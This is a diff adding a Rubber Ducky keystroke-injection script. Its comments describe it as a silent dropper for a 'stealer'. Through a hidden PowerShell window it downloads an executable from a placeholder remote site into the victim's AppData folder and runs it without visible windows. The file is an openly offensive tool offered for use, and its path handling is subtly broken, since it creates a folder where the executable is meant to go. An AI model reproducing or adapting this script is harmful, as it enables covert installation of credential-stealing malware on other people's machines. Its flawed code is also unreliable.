@@ -1,0 +1,25 @@
+**/
+#This RubberDucky script will do everything in silence. 
+#It creates a hidden folder on the target machine and proceeds to download your stealer file supposedly named "setup.exe" from your remote website.
+#After the download is complete, the script runs the downloaded file without triggering any visible windows, ensuring a discreet execution.
+#Modify the stealer.txt and add your website path as well as modify "setup.exe" with your desired .exe file name. 
+/*
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 1000
+STRING $downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'AppData\Local\Downloads\setup.exe')
+ENTER
+DELAY 100
+STRING if (-not (Test-Path -Path $downloadPath)) { New-Item -Path $downloadPath -ItemType Directory }
+ENTER
+DELAY 100
+STRING (New-Object System.Net.WebClient).DownloadFile('https://yourwebsite.com/path/to/setup.exe', $downloadPath)
+ENTER
+DELAY 1000
+STRING Start-Process -FilePath $downloadPath -WindowStyle Hidden
+ENTER
+DELAY 100
